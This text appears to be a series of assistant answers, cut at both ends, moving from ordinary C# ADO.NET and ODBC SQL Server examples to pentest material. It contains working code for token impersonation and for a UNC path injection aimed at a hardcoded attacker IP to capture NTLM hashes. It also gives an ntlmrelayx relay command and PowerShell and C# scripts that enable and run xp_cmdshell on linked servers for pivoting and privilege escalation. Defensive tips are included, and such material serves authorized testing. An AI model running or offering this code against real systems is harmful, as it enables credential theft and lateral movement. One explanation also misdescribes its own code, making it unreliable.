| `ISequentialStream::Read`    | Reads data from a sequential stream, commonly used to fetch blob data. |

### 3. **ADO.NET (Managed API)**
ADO.NET is part of the .NET Framework and is a managed API, which makes it easier and safer to use in .NET applications, including C#.

| Class                        | Description                                                   |
|------------------------------|---------------------------------------------------------------|
| `SqlConnection`              | Represents a connection to a SQL Server database.             |
| `SqlCommand`                 | Represents an SQL statement or stored procedure to execute against a SQL Server database. |
| `SqlDataReader`              | Reads a forward-only stream of rows from a SQL Server database. |
| `SqlDataAdapter`             | Serves as a bridge between a DataSet and a SQL Server database for retrieving and saving data. |
| `SqlParameter`               | Represents a parameter to a `SqlCommand` and optionally its mapping to a `DataSet` column. |

### Sample C# Code Using ADO.NET

Here’s a simple example in C# that demonstrates how to connect to a SQL Server database and execute a query using ADO.NET:

```csharp
using System;
using System.Data.SqlClient;

class Program
{
    static void Main()
    {
        // Define the connection string (replace with your own server and database)
        string connectionString = "Server=your_server_name;Database=your_database_name;User Id=your_username;Password=your_password;";

        // Create a connection object
        using (SqlConnection connection = new SqlConnection(connectionString))
        {
            try
            {
                // Open the connection
                connection.Open();
                Console.WriteLine("Connected to the database successfully!");

                // Create a SQL command
                string sqlQuery = "SELECT TOP 10 * FROM YourTableName";
                using (SqlCommand command = new SqlCommand(sqlQuery, connection))
                {
                    // Execute the command and process the results
                    using (SqlDataReader reader = command.ExecuteReader())
                    {
                        while (reader.Read())
                        {
                            Console.WriteLine($"{reader[0]} - {reader[1]}");
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                // Handle exceptions
                Console.WriteLine("An error occurred: " + ex.Message);
            }
        }
    }
}
```

### Explanation:
- **SqlConnection**: This class represents a connection to the SQL Server. The connection string contains the details required to connect to the database, including server name, database name, and credentials.
- **SqlCommand**: This class represents the SQL query or command that you want to execute.
- **SqlDataReader**: This class is used to read the results of the query in a forward-only manner.

### Using ODBC with C#

If you prefer using ODBC with C#:

```csharp
using System;
using System.Data.Odbc;

class Program
{
    static void Main()
    {
        string connectionString = "Driver={SQL Server};Server=your_server_name;Database=your_database_name;Uid=your_username;Pwd=your_password;";
        using (OdbcConnection connection = new OdbcConnection(connectionString))
        {
            try
            {
                connection.Open();
                Console.WriteLine("Connected via ODBC!");

                string sqlQuery = "SELECT TOP 10 * FROM YourTableName";
                using (OdbcCommand command = new OdbcCommand(sqlQuery, connection))
                {
                    using (OdbcDataReader reader = command.ExecuteReader())
                    {
                        while (reader.Read())
                        {
                            Console.WriteLine($"{reader[0]} - {reader[1]}");
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("An error occurred: " + ex.Message);
            }
        }
    }
}
```

In this example, **OdbcConnection**, **OdbcCommand**, and **OdbcDataReader** are used similarly to their SqlClient counterparts, but with ODBC.

### Summary
- **ODBC** and **OLE DB** are older APIs primarily used in C and C++ for accessing SQL Server.
- **ADO.NET** is the modern managed API for .NET applications, including C#, offering easier and safer access to SQL Server.
- The code examples provided use ADO.NET for simplicity and safety in .NET applications.

These APIs and classes allow for a wide range of database operations, from simple queries to more complex transactions and data manipulations.

To create a C# application that reads from a text file with the specified format, you can follow these steps:

1. **Text File Format**:
   - Each line in the text file should have the format:
     ```
     username,password,sqlserver,database,query1;query2;query3
     ```

   - Example content of the text file:
     ```
     admin,Password123,localhost,TestDB,SELECT * FROM Users;SELECT COUNT(*) FROM Orders
     user1,User1Pass,192.168.1.100,SalesDB,SELECT TOP 10 * FROM Sales
     ```

2. **C# Application**:
   - The application will read the file, parse each line, and execute the queries against the specified SQL Server database.
   - The results will be printed to the console.

Here’s how you can implement this:

```csharp
using System;
using System.Data.SqlClient;
using System.IO;

class Program
{
    static void Main(string[] args)
    {
        string filePath = "input.txt"; // Path to your input file

        // Check if file exists
        if (!File.Exists(filePath))
        {
            Console.WriteLine("File not found!");
            return;
        }

        // Read all lines from the file
        string[] lines = File.ReadAllLines(filePath);

        if (lines.Length < 4)
        {
            Console.WriteLine("Invalid file format. The file should contain at least username, password, server, and database.");
            return;
        }

        // Extract username, password, server, and database
        string username = lines[0];
        string password = lines[1];
        string sqlServer = lines[2];
        string database = lines[3];

        // Queries are in subsequent lines
        string[] queries = lines.Length > 4 ? lines[4..] : new string[] { };

        // Connection string
        string connectionString = $"Server={sqlServer};Database={database};User Id={username};Password={password};";

        try
        {
            using (SqlConnection connection = new SqlConnection(connectionString))
            {
                // Open the connection
                connection.Open();
                Console.WriteLine($"Connected to {sqlServer}/{database} as {username}.");

                // Check user roles
                string roleQuery = "SELECT IS_SRVROLEMEMBER('sysadmin') AS IsSysAdmin, IS_SRVROLEMEMBER('db_owner') AS IsDbOwner, IS_SRVROLEMEMBER('guest') AS IsGuest;";
                using (SqlCommand roleCommand = new SqlCommand(roleQuery, connection))
                {
                    using (SqlDataReader reader = roleCommand.ExecuteReader())
                    {
                        if (reader.Read())
                        {
                            Console.WriteLine("User Roles:");
                            Console.WriteLine($"  SysAdmin: {(reader.GetInt32(0) == 1 ? "Yes" : "No")}");
                            Console.WriteLine($"  DbOwner: {(reader.GetInt32(1) == 1 ? "Yes" : "No")}");
                            Console.WriteLine($"  Guest: {(reader.GetInt32(2) == 1 ? "Yes" : "No")}");
                        }
                    }
                }

                // Execute the queries
                foreach (string query in queries)
                {
                    if (string.IsNullOrWhiteSpace(query)) continue;

                    using (SqlCommand command = new SqlCommand(query, connection))
                    {
                        using (SqlDataReader reader = command.ExecuteReader())
                        {
                            Console.WriteLine($"\nResults for query: {query}");
                            while (reader.Read())
                            {
                                for (int i = 0; i < reader.FieldCount; i++)
                                {
                                    Console.Write($"{reader.GetName(i)}: {reader[i]} ");
                                }
                                Console.WriteLine();
                            }
                        }
                    }
                }
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"An error occurred: {ex.Message}");
        }

        Console.WriteLine("--------------------------------------------------");
    }
}

```

### Explanation:
- **Input File Parsing**: Each line in the file is split by commas. The `Split` function is used to separate the username, password, server, database, and queries.
- **Connection to SQL Server**: The program establishes a connection using `SqlConnection`.
- **Executing Queries**: The queries are separated by semicolons, and each query is executed using `SqlCommand` and `SqlDataReader`.
- **Error Handling**: The code is wrapped in a try-catch block to handle any exceptions, such as connection issues or SQL errors.
- **Output**: The results of each query are printed to the console.

### Running the Application:
1. Save the C# code in a `.cs` file.
2. Compile and run the application using .NET CLI or Visual Studio.
3. Ensure the `input.txt` file exists in the same directory as the executable or provide the correct path.

This application will connect to the specified SQL Server and database, execute the provided queries, and print the results to the console.

Here's an updated version of the C# code using the `Windows.Win32` namespace with the CsWin32 source generator instead of using `DllImport` statements. This approach leverages the CsWin32-generated P/Invoke wrappers.

### Updated C# Code for Token Duplication and Impersonation

```csharp
using System;
using Windows.Win32;
using Windows.Win32.Security;
using Windows.Win32.Foundation;

class Program
{
    static void Main()
    {
        HANDLE processHandle = PInvoke.GetCurrentProcess();
        HANDLE tokenHandle;

        // Open the token associated with the current process
        if (PInvoke.OpenProcessToken(processHandle, TOKEN_ACCESS_RIGHTS.TOKEN_DUPLICATE | TOKEN_ACCESS_RIGHTS.TOKEN_QUERY | TOKEN_ACCESS_RIGHTS.TOKEN_IMPERSONATE, out tokenHandle))
        {
            HANDLE duplicatedTokenHandle;
            // Duplicate the token to create an impersonation token
            if (PInvoke.DuplicateTokenEx(tokenHandle, TOKEN_ACCESS_RIGHTS.TOKEN_ADJUST_PRIVILEGES | TOKEN_ACCESS_RIGHTS.TOKEN_IMPERSONATE, null,
                SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation, TOKEN_TYPE.TokenPrimary, out duplicatedTokenHandle))
            {
                Console.WriteLine("Token duplicated successfully.");

                // Impersonate the token
                if (PInvoke.ImpersonateLoggedOnUser(duplicatedTokenHandle))
                {
                    Console.WriteLine("Successfully impersonated the token.");

                    // Execute SQL commands or other privileged actions under the impersonated context
                    // Example: ExecuteSQLCommand();

                    // Revert back to original context
                    PInvoke.RevertToSelf();
                    Console.WriteLine("Reverted to original security context.");
                }
                else
                {
                    Console.WriteLine("Failed to impersonate the token.");
                }

                PInvoke.CloseHandle(duplicatedTokenHandle);
            }
            else
            {
                Console.WriteLine("Failed to duplicate the token.");
            }

            PInvoke.CloseHandle(tokenHandle);
        }
        else
        {
            Console.WriteLine("Failed to open process token.");
        }
    }

    static void ExecuteSQLCommand()
    {
        // Here you can add code to connect to SQL Server and execute commands with elevated privileges
    }
}
```

### How the Code Works:
1. **PInvoke.GetCurrentProcess**: Retrieves the handle of the current process.
2. **PInvoke.OpenProcessToken**: Opens the token associated with the current process.
3. **PInvoke.DuplicateTokenEx**: Duplicates the token, creating an impersonation token.
4. **PInvoke.ImpersonateLoggedOnUser**: Uses the duplicated token to impersonate the user associated with that token.
5. **PInvoke.RevertToSelf**: Reverts back to the original security context after performing privileged operations.

### Benefits:
- **Strong Typing**: The use of `Windows.Win32` and CsWin32 provides a strongly-typed API surface, reducing the likelihood of errors.
- **Simplified Development**: By using the CsWin32 source generator, you avoid manually defining `DllImport` signatures, which can be error-prone.

You can extend this example to include the SQL Server operations you want to perform under the impersonated context. If needed, you can also handle specific security contexts and permissions according to your requirements.

### UNC Path Injection with Hash Capture

UNC path injection is a technique used to force a Windows machine to authenticate to a remote server by specifying a UNC path (`\\attacker_ip\share`). When the victim machine tries to access this path, it sends the user's credentials in the form of an NTLM hash to the attacker-controlled server. 

### C# Code for UNC Path Injection
Here’s a simple example in C# that triggers a UNC path injection:

```csharp
using System;

class Program
{
    static void Main()
    {
        // The UNC path should point to your attacker's IP address or hostname
        string uncPath = @"\\192.168.1.100\share";

        try
        {
            // Attempting to access the UNC path
            Console.WriteLine("Triggering UNC path injection...");
            System.IO.File.ReadAllText(uncPath);
        }
        catch (Exception ex)
        {
            Console.WriteLine($"An error occurred: {ex.Message}");
        }
    }
}
```

### Capturing the Hash

Typically, tools like Responder or Inveigh are used to capture NTLM hashes when performing UNC path injection attacks. These tools listen on the network for incoming NTLM authentication attempts and capture the credentials.

### NTLM Relay Attack Overview

**NTLM Relay Attack** is a type of man-in-the-middle (MitM) attack where an attacker intercepts and relays NTLM authentication messages between a client and a server, without needing to crack the credentials. The attacker acts as a relay between the victim and the target server, forwarding authentication requests and responses while potentially modifying the traffic to gain unauthorized access.

### How NTLM Relay Attack Works:
1. **Capture NTLM Authentication**: The attacker lures the victim into authenticating against a malicious SMB server using NTLM. This can be achieved through phishing, UNC path injection, or other social engineering tactics.

2. **Relay the Authentication**: Instead of trying to crack the captured NTLM hash, the attacker forwards (relays) it to a legitimate service (like SMB, HTTP, LDAP) on a different server, which accepts NTLM authentication.

3. **Gain Access**: If the relayed authentication is successful, the attacker gains access to the service using the victim's credentials.

### Determining if NTLM Relay is Possible

To assess whether an NTLM relay attack is possible, consider the following factors:

1. **SMB Signing**:
   - **Disabled or Not Required**: If SMB signing is disabled or not required, NTLM relay attacks are possible. SMB signing ensures that the communication is secure, making it harder to relay the NTLM authentication.
   - **Enabled and Required**: If SMB signing is required, NTLM relay attacks are generally not feasible because the attacker cannot modify the traffic without detection.

   **Command to Check SMB Signing on a Windows System**:
   ```powershell
   Get-SmbServerConfiguration | Select-Object RequireSecuritySignature
   ```
   If `RequireSecuritySignature` is `False`, NTLM relay is possible.

2. **LDAP Signing and Channel Binding**:
   - **LDAP Signing Disabled**: If LDAP signing is not enforced, LDAP servers may be vulnerable to NTLM relay attacks.
   - **LDAP Channel Binding**: This further secures LDAP connections and mitigates the risk of NTLM relay.

   **Commands to Check LDAP Signing**:
   ```powershell
   reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows\LDAP" /v LDAPServerIntegrity
   ```
   A value of `1` means signing is required; `2` means signing is required unless SSL/TLS is used.

3. **HTTP Applications**:
   - **No HTTPS/TLS**: If an HTTP service accepts NTLM authentication over plain HTTP (no SSL/TLS), it may be vulnerable to NTLM relay.

4. **Permissions on the Target**:
   - Even if an NTLM relay attack succeeds, the attacker’s access is limited to the permissions of the relayed account. Therefore, NTLM relay is particularly dangerous if the relayed account has administrative privileges.

### Tools to Test for NTLM Relay Vulnerabilities

1. **Responder**: Can be used to capture NTLM hashes on a network and can be combined with other tools to perform NTLM relay attacks.
2. **Impacket's ntlmrelayx.py**: A powerful tool that automates the process of relaying NTLM authentication to various protocols such as SMB, HTTP, LDAP, etc.
   - **Command**:
     ```bash
     ntlmrelayx.py -tf targets.txt -smb2support
     ```
     Where `targets.txt` is a file containing the IP addresses of the servers you want to relay to.

3. **Inveigh**: A PowerShell tool for Windows that can be used similarly to Responder, primarily for SMB and HTTP relay attacks.

### Defenses Against NTLM Relay

1. **Enable SMB Signing**: Ensure that SMB signing is required across your network.
2. **Enforce LDAP Signing and Channel Binding**: Enable these settings on all LDAP servers to mitigate LDAP-based relay attacks.
3. **Use HTTPS/TLS**: Ensure that all web applications use HTTPS to prevent NTLM relay over HTTP.
4. **Disable NTLM**: Where possible, disable NTLM and use more secure authentication protocols like Kerberos.

### Conclusion

An NTLM relay attack can be devastating, especially if the attacker relays the authentication to a service where the user has administrative privileges. Regularly auditing systems for SMB signing, LDAP signing, and channel binding enforcement can help mitigate the risk of such attacks.


I'd be happy to explain how to execute remote stored procedures and enumerate linked servers. Let's cover both topics:

1. Executing Remote Stored Procedures:

To execute a stored procedure on a linked server, you can use the following syntax:

```sql
EXEC [linked_server_name].[database_name].[schema_name].[stored_procedure_name] @parameter1 = value1, @parameter2 = value2
```

For example:

```sql
EXEC [RemoteServer].[AdventureWorks].[dbo].[usp_GetEmployeeInfo] @EmployeeID = 12345
```

Alternatively, you can use the OPENQUERY function:

```sql
SELECT * FROM OPENQUERY(linked_server_name, 
    'EXEC database_name.schema_name.stored_procedure_name @param1 = value1, @param2 = value2')
```

2. Enumerating Linked Servers:

There are several ways to list linked servers in SQL Server:

a. Using SQL Server Management Studio (SSMS):
   - Expand the "Server Objects" folder
   - Look under the "Linked Servers" subfolder

b. Using system views:

```sql
SELECT name, product, provider, data_source
FROM sys.servers
WHERE is_linked = 1
```

c. Using sp_helpserver system stored procedure:

```sql
EXEC sp_helpserver
```

d. Using TSQL to query server-level metadata:

```sql
SELECT * FROM sys.linked_logins
SELECT * FROM sys.remote_logins
```

e. To get more detailed information about linked servers:

```sql
EXEC sp_linkedservers
```

This will return information such as the server name, product name, provider name, data source, location, provider string, and catalog.

### **Linked SQL Servers Overview**

**Linked SQL Servers** allow one SQL Server instance to execute commands against another SQL Server instance. This feature is useful for querying data across different servers, but it can introduce security risks if not properly configured.

**Linked Servers** are defined within a SQL Server instance, and they are accessible via SQL Server Management Studio (SSMS) or T-SQL commands. When a linked server is configured, SQL Server can execute queries, stored procedures, and other commands on the remote server as if it were local.

### **Enumerating Linked SQL Servers**

To enumerate linked SQL Servers, you can use the following T-SQL commands:

1. **Listing Linked Servers:**
   ```sql
   EXEC sp_linkedservers;
   ```

2. **Detailed Information on Linked Servers:**
   ```sql
   EXEC sp_helpserver;
   ```

3. **Check Login Mappings:**
   ```sql
   EXEC sp_helplinkedsrvlogin @rmtsrvname = 'LinkedServerName';
   ```

4. **Check Available Tables on the Linked Server:**
   ```sql
   SELECT * FROM LinkedServerName.DatabaseName.SchemaName.TableName;
   ```

### **Exploiting Linked SQL Servers with PowerShell**

If you have access to a SQL Server that is linked to other servers, you can leverage PowerShell to enumerate and exploit those linked servers.

#### **Enumerating Linked Servers with PowerShell**

```powershell
# Define the SQL Server and query to list linked servers
$serverInstance = "your_sql_server_instance"
$query = "EXEC sp_linkedservers"

# Execute the query using Invoke-Sqlcmd
Invoke-Sqlcmd -ServerInstance $serverInstance -Query $query
```

#### **Running a Query on a Linked Server**

Once you have identified a linked server, you can run queries against it:

```powershell
# Query against a linked server
$linkedServer = "LinkedServerName"
$remoteQuery = "SELECT * FROM $linkedServer.DatabaseName.SchemaName.TableName"

# Execute the query on the remote server via the linked server
Invoke-Sqlcmd -ServerInstance $serverInstance -Query $remoteQuery
```

### **Exploiting Linked SQL Servers with C#**

In C#, you can achieve similar functionality by using `System.Data.SqlClient` to connect to SQL Server and execute queries against linked servers.

#### **Enumerating Linked Servers with C#**

```csharp
using System;
using System.Data.SqlClient;

class Program
{
    static void Main()
    {
        string connectionString = "Server=your_sql_server_instance;Integrated Security=True;";
        using (SqlConnection connection = new SqlConnection(connectionString))
        {
            connection.Open();

            // Query to enumerate linked servers
            string query = "EXEC sp_linkedservers";
            using (SqlCommand command = new SqlCommand(query, connection))
            using (SqlDataReader reader = command.ExecuteReader())
            {
                while (reader.Read())
                {
                    Console.WriteLine($"Linked Server: {reader["SRV_NAME"]}");
                }
            }
        }
    }
}
```

#### **Running a Query on a Linked Server with C#**

```csharp
using System;
using System.Data.SqlClient;

class Program
{
    static void Main()
    {
        string connectionString = "Server=your_sql_server_instance;Integrated Security=True;";
        string linkedServer = "LinkedServerName";
        string query = $"SELECT * FROM {linkedServer}.DatabaseName.SchemaName.TableName";

        using (SqlConnection connection = new SqlConnection(connectionString))
        {
            connection.Open();
            using (SqlCommand command = new SqlCommand(query, connection))
            using (SqlDataReader reader = command.ExecuteReader())
            {
                while (reader.Read())
                {
                    // Process data
                    Console.WriteLine(reader[0].ToString());
                }
            }
        }
    }
}
```

### **Exploitation Techniques**

1. **Remote Command Execution**:
   - If the linked server is misconfigured, it might allow running commands on the remote server using the `xp_cmdshell` extended stored procedure. Ensure `xp_cmdshell` is enabled on the remote server:
   ```sql
   EXEC LinkedServerName.master.dbo.sp_configure 'xp_cmdshell', 1; RECONFIGURE;
   EXEC LinkedServerName.master.sys.xp_cmdshell 'whoami';
   ```

2. **Pivoting**:
   - If you gain control over one server, you can pivot to another server using linked servers. For example, if you have access to a less-secure server, you might use that access to pivot to a more secure server that is linked.

3. **Data Exfiltration**:
   - You can use linked servers to exfiltrate data from remote servers, assuming you have appropriate permissions.

4. **Privilege Escalation**:
   - If the linked server is configured to use a high-privilege account (like `sa`), you can use this account to escalate your privileges on the remote server.

### **Defensive Measures**

- **Restrict Linked Server Configurations**: Only configure linked servers when necessary and ensure they use the least privilege principle.
- **Audit Linked Server Logins**: Regularly audit login mappings and permissions associated with linked servers.
- **Monitor SQL Traffic**: Use monitoring tools to detect unusual activity involving linked servers.

### Conclusion

Linked SQL Servers can be a powerful feature but also pose significant security risks if not properly managed. By understanding how to enumerate and exploit linked servers using PowerShell or C#, you can better defend against potential attacks or leverage them in penetration testing scenarios. Always ensure that you have authorization before attempting to exploit linked servers.

Taking advantage of the linked security context on a different SQL Server through a linked server connection can be a powerful technique, particularly in a penetration testing or Red Team scenario. The linked security context can be exploited if the linked server is configured to use a privileged account, such as `sa` (System Administrator), or another high-privilege account.

### **Understanding Linked Security Contexts**

When you set up a linked server in SQL Server, you can configure the security context for how authentication is handled when accessing the remote server. The security context could be:

1. **Self-mapping (Current security context)**: The current SQL login context is used to connect to the linked server.
2. **Specific User Mapping**: A specific SQL Server login or Windows user account is used to connect to the linked server.
3. **Anonymous Mapping**: Connection is made with an anonymous user or without any user credentials.
4. **Impersonation**: The connection is made using a different user context, usually specified in the linked server's security settings.

### **Exploiting Linked Security Context Using PowerShell**

#### 1. **Enumerate Linked Servers and Test Connectivity**

First, you can enumerate linked servers and test the connectivity.

```powershell
$serverInstance = "your_sql_server_instance"
$linkedServers = Invoke-Sqlcmd -ServerInstance $serverInstance -Query "EXEC sp_linkedservers;"

foreach ($linkedServer in $linkedServers) {
    Write-Host "Testing Linked Server: $($linkedServer.SRV_NAME)"
    try {
        $query = "SELECT SYSTEM_USER AS CurrentUser, SESSION_USER AS SessionUser;"
        $result = Invoke-Sqlcmd -ServerInstance $serverInstance -Query $query -Database "master" -LinkedServer $linkedServer.SRV_NAME
        Write-Host "Connected as: $($result.CurrentUser) / $($result.SessionUser)"
    } catch {
        Write-Host "Failed to connect to $($linkedServer.SRV_NAME)"
    }
}
```

This script lists linked servers and attempts to connect to each one, printing the user context in which the connection is made.

#### 2. **Execute Commands on the Linked Server**

If the linked server allows, you can execute commands under the security context of the linked server's login.

```powershell
$serverInstance = "your_sql_server_instance"
$linkedServer = "LinkedServerName"
$command = "SELECT SYSTEM_USER AS CurrentUser, SESSION_USER AS SessionUser;"

$query = "EXEC [$linkedServer].master.dbo.sp_executesql N'$command';"
Invoke-Sqlcmd -ServerInstance $serverInstance -Query $query
```

This command executes a query on the linked server and prints the current and session users.

#### 3. **Abuse `xp_cmdshell` on the Linked Server**

If `xp_cmdshell` is enabled or can be enabled on the linked server, you can execute OS commands remotely.

```powershell
$serverInstance = "your_sql_server_instance"
$linkedServer = "LinkedServerName"

# Enable xp_cmdshell on the linked server if not enabled
$query = "EXEC [$linkedServer].master.dbo.sp_configure 'xp_cmdshell', 1; RECONFIGURE;"
Invoke-Sqlcmd -ServerInstance $serverInstance -Query $query

# Run a command on the linked server
$command = "whoami"
$query = "EXEC [$linkedServer].master.sys.xp_cmdshell '$command';"
$result = Invoke-Sqlcmd -ServerInstance $serverInstance -Query $query
Write-Host $result
```

### **Exploiting Linked Security Context Using C#**

#### 1. **Enumerate Linked Servers**

In C#, you can use the `System.Data.SqlClient` namespace to connect to SQL Server and enumerate linked servers.

```csharp
using System;
using System.Data.SqlClient;

class Program
{
    static void Main()
    {
        string connectionString = "Server=your_sql_server_instance;Integrated Security=True;";
        using (SqlConnection connection = new SqlConnection(connectionString))
        {
            connection.Open();

            // Enumerate linked servers
            string query = "EXEC sp_linkedservers";
            using (SqlCommand command = new SqlCommand(query, connection))
            using (SqlDataReader reader = command.ExecuteReader())
            {
                while (reader.Read())
                {
                    string linkedServerName = reader["SRV_NAME"].ToString();
                    Console.WriteLine($"Linked Server: {linkedServerName}");

                    // Test connection to linked server
                    TestLinkedServerConnection(connection, linkedServerName);
                }
            }
        }
    }

    static void TestLinkedServerConnection(SqlConnection connection, string linkedServerName)
    {
        string query = $"SELECT SYSTEM_USER AS CurrentUser, SESSION_USER AS SessionUser FROM [{linkedServerName}].master.sys.databases";
        using (SqlCommand command = new SqlCommand(query, connection))
        {
            try
            {
                using (SqlDataReader reader = command.ExecuteReader())
                {
                    while (reader.Read())
                    {
                        Console.WriteLine($"Connected to {linkedServerName} as {reader["CurrentUser"]} / {reader["SessionUser"]}");
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Failed to connect to {linkedServerName}: {ex.Message}");
            }
        }
    }
}
```

#### 2. **Execute Commands on Linked Servers**

You can also run arbitrary commands on the linked server under the security context of the linked server's login.

```csharp
using System;
using System.Data.SqlClient;

class Program
{
    static void Main()
    {
        string connectionString = "Server=your_sql_server_instance;Integrated Security=True;";
        string linkedServer = "LinkedServerName";
        string command = "SELECT SYSTEM_USER AS CurrentUser, SESSION_USER AS SessionUser;";

        using (SqlConnection connection = new SqlConnection(connectionString))
        {
            connection.Open();

            string query = $"EXEC [{linkedServer}].master.dbo.sp_executesql N'{command}';";
            using (SqlCommand sqlCommand = new SqlCommand(query, connection))
            {
                using (SqlDataReader reader = sqlCommand.ExecuteReader())
                {
                    while (reader.Read())
                    {
                        Console.WriteLine($"Connected as {reader["CurrentUser"]} / {reader["SessionUser"]}");
                    }
                }
            }
        }
    }
}
```

#### 3. **Abuse `xp_cmdshell` on Linked Servers**

If `xp_cmdshell` is enabled on the linked server, you can run OS-level commands remotely.

```csharp
using System;
using System.Data.SqlClient;

class Program
{
    static void Main()
    {
        string connectionString = "Server=your_sql_server_instance;Integrated Security=True;";
        string linkedServer = "LinkedServerName";
        string command = "whoami";

        using (SqlConnection connection = new SqlConnection(connectionString))
        {
            connection.Open();

            // Enable xp_cmdshell if needed
            string enableCmdShellQuery = $"EXEC [{linkedServer}].master.dbo.sp_configure 'xp_cmdshell', 1; RECONFIGURE;";
            using (SqlCommand enableCmdShellCommand = new SqlCommand(enableCmdShellQuery, connection))
            {
                enableCmdShellCommand.ExecuteNonQuery();
            }

            // Run command on linked server
            string query = $"EXEC [{linkedServer}].master.sys.xp_cmdshell '{command}';";
            using (SqlCommand cmdShellCommand = new SqlCommand(query, connection))
            {
                using (SqlDataReader reader = cmdShellCommand.ExecuteReader())
                {
                    while (reader.Read())
                    {
                        Console.WriteLine(reader[0].ToString());
                    }
                }
            }
        }
    }
}
```

### **Important Considerations**

- **Permissions**: The effectiveness of these techniques depends on the permissions of the linked server configuration. If the linked server is configured to use a high-privilege account, you can potentially execute commands with those privileges.
- **Audit Logging**: These activities are likely to be logged in SQL Server’s audit logs. Ensure you have permission to perform these actions or be aware that they might be detected.
- **Security Implications**: Exploiting linked servers can have serious security implications. Ensure that you are authorized to perform these actions.

### **Defensive Measures**

- **Restrict Linked Server Permissions**: Ensure that linked servers are configured with the least privilege required and avoid using high-privilege accounts like `sa`.
- **Audit Linked Server Usage**: Regularly audit the usage and configuration of linked servers to detect and respond to potential abuses.
- **Disable Unnecessary Features**: Disable `xp_cmdshell` and other risky features unless absolutely necessary.

By understanding how to exploit linked security contexts, you can better protect your SQL Server environment or leverage these techniques in authorized penetration testing engagements.

**RPC Out** refers to the ability of a SQL Server to make Remote Procedure Calls (RPCs) to a linked server. When `RPC Out` is enabled, SQL Server can execute stored procedures and queries on a remote server via a linked server connection.

### **Understanding RPC Out**

- **RPC** (Remote Procedure Call) allows SQL Server to execute commands on a remote server as if they were being executed locally.
- **RPC Out** specifically refers to the permission that allows a SQL Server to send such remote procedure calls to a linked server.

### **Determining if RPC Out is Enabled**

You can determine if `RPC Out` is enabled for a linked server by querying the `sys.servers` or `sys.linked_logins` system views.

#### **T-SQL Query to Check RPC Out Setting:**

```sql
SELECT name AS LinkedServerName, rpc_out_enabled
FROM sys.servers
WHERE is_linked = 1;
```

- **`rpc_out_enabled`**: This column will return `1` if `RPC Out` is enabled, and `0` if it is disabled.

### **Enabling RPC Out**

You can enable `RPC Out` for a linked server using the following methods:

#### **Method 1: Using SQL Server Management Studio (SSMS)**

1. **Open SQL Server Management Studio** and connect to your SQL Server instance.
2. **Expand the "Server Objects"** node.
3. **Expand the "Linked Servers"** node.
4. **Right-click on the linked server** you want to configure and select **"Properties"**.
5. Go to the **"Server Options"** tab.
6. Find the **"RPC Out"** option and set it to **"True"**.
7. Click **"OK"** to save the changes.

#### **Method 2: Using T-SQL**

You can enable `RPC Out` for a linked server by executing the following T-SQL command:

```sql
EXEC sp_serveroption @server = 'LinkedServerName', @optname = 'rpc out', @optvalue = 'true';
```

Replace `'LinkedServerName'` with the name of your linked server.

### **Example Scenario**

If you have a linked server named `LinkedServer1` and you want to ensure that `RPC Out` is enabled, you would:

1. **Check the Current Setting:**

   ```sql
   SELECT name AS LinkedServerName, rpc_out_enabled
   FROM sys.servers
   WHERE name = 'LinkedServer1';
   ```

2. **Enable RPC Out if Disabled:**

   ```sql
   EXEC sp_serveroption @server = 'LinkedServer1', @optname = 'rpc out', @optvalue = 'true';
   ```

### **Verifying the Configuration**

After enabling `RPC Out`, you can verify that it has been set correctly by re-running the query:

```sql
SELECT name AS LinkedServerName, rpc_out_enabled
FROM sys.servers
WHERE name = 'LinkedServer1';
```

### **PowerShell Method**

You can also use PowerShell to check and enable `RPC Out` on a linked server.

#### **Checking RPC Out Status with PowerShell:**

```powershell
$serverInstance = "your_sql_server_instance"
$linkedServerName = "LinkedServer1"

$query = "SELECT rpc_out_enabled FROM sys.servers WHERE name = '$linkedServerName';"
$rpcOutEnabled = Invoke-Sqlcmd -ServerInstance $serverInstance -Query $query | Select-Object -ExpandProperty rpc_out_enabled

if ($rpcOutEnabled -eq 1) {
    Write-Host "RPC Out is enabled on $linkedServerName."
} else {
    Write-Host "RPC Out is not enabled on $linkedServerName."
}
```

#### **Enabling RPC Out with PowerShell:**

```powershell
$serverInstance = "your_sql_server_instance"
$linkedServerName = "LinkedServer1"

$query = "EXEC sp_serveroption @server = '$linkedServerName', @optname = 'rpc out', @optvalue = 'true';"
Invoke-Sqlcmd -ServerInstance $serverInstance -Query $query

Write-Host "RPC Out has been enabled on $linkedServerName."
```

### **Considerations**

- **Security Risks**: Enabling `RPC Out` can expose the linked server to additional risks if not properly secured. Only enable it if necessary and ensure that proper permissions and security measures are in place.
- **Permissions**: You need sufficient privileges (such as `sysadmin` or `db_owner`) to change linked server options.
- **Audit and Monitor**: Regularly audit and monitor linked server configurations to ensure that they comply with your organization’s security policies.

By understanding and configuring `RPC Out`, you can effectively manage linked server interactions and ensure that remote procedure calls are enabled and functioning as required.

You can use C# to check whether `RPC Out` is enabled for a linked server and to enable it if it's not. Below is an example of how to achieve this using the `System.Data.SqlClient` namespace in C#.

### **C# Code Example**

This C# code snippet demonstrates how to:

1. **Check if `RPC Out` is enabled** for a specific linked server.
2. **Enable `RPC Out`** if it's not already enabled.

```csharp
using System;
using System.Data.SqlClient;

class Program
{
    static void Main(string[] args)
    {
        string connectionString = "Server=your_sql_server_instance;Database=master;Integrated Security=True;";
        string linkedServerName = "LinkedServer1";

        using (SqlConnection connection = new SqlConnection(connectionString))
        {
            connection.Open();

            // Step 1: Check if RPC Out is enabled for the linked server
            if (IsRpcOutEnabled(connection, linkedServerName))
            {
                Console.WriteLine($"RPC Out is already enabled on {linkedServerName}.");
            }
            else
            {
                Console.WriteLine($"RPC Out is not enabled on {linkedServerName}. Enabling it now...");

                // Step 2: Enable RPC Out for the linked server
                EnableRpcOut(connection, linkedServerName);

                // Verify that RPC Out is now enabled
                if (IsRpcOutEnabled(connection, linkedServerName))
                {
                    Console.WriteLine($"RPC Out has been successfully enabled on {linkedServerName}.");
                }
                else
                {
                    Console.WriteLine($"Failed to enable RPC Out on {linkedServerName}.");
                }
            }
        }
    }

    static bool IsRpcOutEnabled(SqlConnection connection, string linkedServerName)
    {
        string query = "SELECT rpc_out_enabled FROM sys.servers WHERE name = @LinkedServerName";
        using (SqlCommand command = new SqlCommand(query, connection))
        {
            command.Parameters.AddWithValue("@LinkedServerName", linkedServerName);
